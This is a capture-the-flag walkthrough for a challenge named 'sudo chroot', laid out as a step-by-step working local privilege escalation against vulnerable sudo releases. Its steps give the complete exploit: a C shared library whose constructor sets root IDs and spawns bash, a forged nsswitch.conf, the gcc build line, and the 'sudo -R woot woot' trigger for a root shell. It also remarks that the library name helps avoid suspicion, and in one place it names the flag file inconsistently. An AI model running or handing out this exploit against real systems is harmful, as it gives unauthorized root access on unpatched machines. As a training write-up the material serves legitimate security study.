

# **sudo chroot**

This challenge tasks you with obtaining the flag located at /root/fl4g.txt. Follow the documented steps to exploit a vulnerability in certain sudo releases; successfully completing them will allow you to spawn an elevated shell without knowing the root password, after which you can read the flag from /root/fl4g.txt.

## Solution Steps

### Step 1: Create the C Exploit File

```bash
cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c","/bin/bash", NULL);
}
EOF
```

**Explanation**: This command creates a C file named `woot1337.c` using a here document. The code defines a function `woot()` with the `constructor` attribute, which means it will execute automatically when the library is loaded. The function sets the effective user and group IDs to 0 (root), changes the directory to the root folder, and then executes a bash shell. This is the core of our privilege escalation exploit.

### Step 2: Create Required Directories

```bash
mkdir -p woot/etc libnss_
```

**Explanation**: This command creates the necessary directory structure for our exploit. The `-p` flag ensures parent directories are created if they don't exist. We're creating a `woot` directory with an `etc` subdirectory for configuration files, and a `libnss_` directory which will contain our malicious library. This structure mimics parts of the Linux filesystem hierarchy.

### Step 3: Configure NSSwitch

```bash
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
```

[SCREENSHOT HERE]

**Explanation**: This command creates a custom `nsswitch.conf` file inside our `woot/etc` directory. The file tells the system to use `/woot1337` as the source for passwd information. This is a crucial step as it tricks the system into loading our malicious library when it tries to resolve user information.

### Step 4: Copy Group File

```bash
cp /etc/group woot/etc
```

**Explanation**: This command copies the system's `/etc/group` file to our `woot/etc` directory. This maintains proper group permissions and ensures the system can correctly resolve group information when operating within our custom environment. Without this, certain operations might fail due to missing group information.

### Step 5: Compile the Exploit

```bash
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
```

**Explanation**: This command compiles our C code into a shared library. The flags used are:
- `-shared`: Creates a shared library
- `-fPIC`: Generates position-independent code
- `-Wl,-init,woot`: Passes the `-init,woot` option to the linker, specifying that our `woot` function should be called when the library is loaded
- `-o libnss_/woot1337.so.2`: Specifies the output file name and location

The `.2` extension makes it look like a legitimate system library, which helps avoid suspicion.

### Step 6: Execute the Exploit

```bash
sudo -R woot woot
```

**Explanation**: This command uses `sudo` with a custom path (`-R woot woot`) to execute our exploit. The `-R` option is used to set the runtime path, which tricks sudo into using our custom directory structure. When sudo tries to resolve user information, it will load our malicious library from the `libnss_` directory, which will execute our constructor function and give us a root shell.

### Step 7: Retrieve the Flag

```bash
cat /root/fl4g.txt
```

**Explanation**: After successfully escalating privileges to root, this command reads and displays the contents of the flag file located at `root/flag.txt`. This is the final step in the CTF challenge, where we retrieve the flag to prove we've successfully compromised the system.
